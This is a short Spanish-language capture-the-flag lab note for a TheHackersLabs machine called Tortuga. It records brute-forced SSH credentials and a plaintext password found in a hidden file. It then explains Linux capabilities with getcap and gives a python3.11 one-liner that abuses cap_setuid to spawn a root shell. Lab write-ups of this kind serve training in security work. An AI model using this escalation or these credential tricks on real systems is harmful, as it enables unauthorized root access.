
[22][ssh] host: 10.208.219.149   login: grumete   password: 1234
grumete@TheHackersLabs-Tortuga:~$ cat .nota.txt

usr: capitan
"mar_de_fuego123"  



**Getcap**
getcap` sirve para **ver las capabilities (capacidades) asignadas a archivos** en Linux.
Las _capabilities_ permiten que un binario tenga **privilegios específicos de root sin ser SUID**.
En vez de dar **todo el poder de root**, solo se otorgan permisos concretos como:

- `cap_setuid`   
- `cap_net_bind_service`
    
- `cap_sys_admin`


Cómo usarlo

Buscar capabilities en todo el sistema

==**getcap -r / 2>/dev/null**==

📌 `-r` = recursivo  
📌 `2>/dev/null` = ocultar errores de permisos

**==python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'==**

### `cap_setuid`
Permite cambiar el UID del proceso (muy interesante en escaladas de privilegios.